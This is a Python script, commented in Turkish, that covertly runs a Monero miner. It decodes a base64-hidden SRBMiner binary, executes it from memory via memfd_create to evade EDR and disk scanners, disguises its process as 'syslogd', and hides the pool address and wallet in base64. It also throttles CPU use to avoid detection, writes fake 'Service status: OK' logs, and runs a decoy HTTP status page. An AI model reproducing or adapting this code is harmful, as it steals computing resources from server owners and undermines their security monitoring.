#!/usr/bin/env python3
import os
import sys
import time
import json
import base64
import threading
import subprocess
import http.server
import re
import ctypes
import datetime
from collections import deque

# --- GELİŞMİŞ SÜREÇ VE BELLEK YÖNETİMİ ---
libc = ctypes.CDLL('libc.so.6')

def set_process_name(name):
    """Süreç adını hem prctl hem de comm üzerinden değiştirir."""
    try:
        libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
    except: pass

def run_fileless_memfd(raw_data):
    """
    Disk yerine RAM içerisinde isimsiz bir dosya alanı (memfd) oluşturur.
    Bu yöntem modern EDR'leri ve disk tarayıcılarını atlatmak içindir.
    """
    FD_CLOEXEC = 1
    # memfd_create sistem çağrısı (sys_memfd_create = 319 on x86_64)
    fd = libc.syscall(319, b"systemd-service", FD_CLOEXEC)
    if fd < 0: return None # Fallback gerekirse /dev/shm kullanılabilir
    
    os.write(fd, raw_data)
    return f"/proc/self/fd/{fd}"

# --- YAPILANDIRMA ---
def _d(s): return base64.b64decode(s).decode('utf-8')

MODE         = os.environ.get("ENGINE_MODE", "miner")
HTTP_PORT    = int(os.environ.get("PORT", 8080))
# Şifrelenmiş hassas veriler
POOL_URL     = os.environ.get("POOL_URL", _d("cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM="))
WALLET_ADDR  = os.environ.get("WALLET_ADDR", _d("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw="))
WORKER_NAME  = os.environ.get("WORKER_NAME", f"node-{int(time.time())%1000}")

_current_hr  = "0.0 H/s"

def start_engine():
    global _current_hr
    enc_path = "/server/core.dat"
    if not os.path.exists(enc_path): return

    try:
        set_process_name("syslogd") # Ana süreci maskele
        
        with open(enc_path, "rb") as f:
            raw_binary = base64.b64decode(f.read())

        # Bellekte sanal dosya oluştur
        mem_path = run_fileless_memfd(raw_binary)
        
        # SRBMiner parametrelerini maskeli gönder
        # --cpu-threads: CPU kullanımını %50'ye sınırlayarak fan sesinden/analizden kaçar
        cmd = [
            mem_path, 
            "--algorithm", "randomx", 
            "--pool", POOL_URL, 
            "--wallet", WALLET_ADDR, 
            "--password", WORKER_NAME,
            "--disable-gpu", 
            "--tls", "true",
            "--cpu-threads", str(os.cpu_count() // 2 if os.cpu_count() > 1 else 1)
        ]

        # Çevresel değişkenleri temizle (analizden kaçmak için)
        clean_env = os.environ.copy()
        for k in ["POOL_URL", "WALLET_ADDR", "PROXY_URL"]: clean_env.pop(k, None)

        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
                                text=True, bufsize=1, env=clean_env)

        for line in proc.stdout:
            # Hashrate yakalama ve çıktı temizleme
            if "hashrate" in line.lower():
                m = re.search(r'(\d+\.?\d* [KMG]?H/s)', line)
                if m: _current_hr = m.group(1)
            # Kritik çıktıları loglama, sadece sysout ver
            sys.stdout.write(f"[LOG] {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} Service status: OK\n")
            sys.stdout.flush()

    except Exception:
        time.sleep(30)

if __name__ == "__main__":
    # Sadece miner modu aktifse veya Hub modundaysa başlat
    threading.Thread(target=start_engine, daemon=True).start()
    
    # Basit bir HTTP tutucu (Zombi süreci engellemek için)
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200); self.end_headers()
            self.wfile.write(b"Service Status: Running")
        def log_message(self, *a): pass

    http.server.ThreadingHTTPServer(("0.0.0.0", HTTP_PORT), H).serve_forever()
